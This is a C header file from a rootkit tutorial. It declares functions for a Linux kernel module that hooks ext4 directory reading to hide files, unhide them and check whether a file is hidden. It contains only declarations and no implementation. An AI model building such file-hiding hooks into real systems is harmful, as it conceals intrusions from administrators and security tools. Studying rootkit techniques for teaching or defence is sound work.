// Beneath C Level - Rootkit tutorial
//
// ext4_ops.h - The header file for the ext4 operations
//
// Author: Nick Newson
// Website: http://beneathclevel.blogspot.co.uk/
//
// Tab size = 4

#ifndef __KM_EXT4_OPS_H__
#define __KM_EXT4_OPS_H__

#include <linux/fs.h>

// Type Declarations
typedef struct file					file;

// Function Declarations
void								km_ext4_ops_apply_readdir(
										void );

void								km_ext4_ops_remove_readdir(
										void );

void								km_ext4_ops_hide_file(
										const char* const		file );

void								km_ext4_ops_show_file(
										const char* const		file );

int									km_ext4_ops_is_file_hidden(
										const char* const		file );

#endif // __KM_EXT4_OPS_H__ 
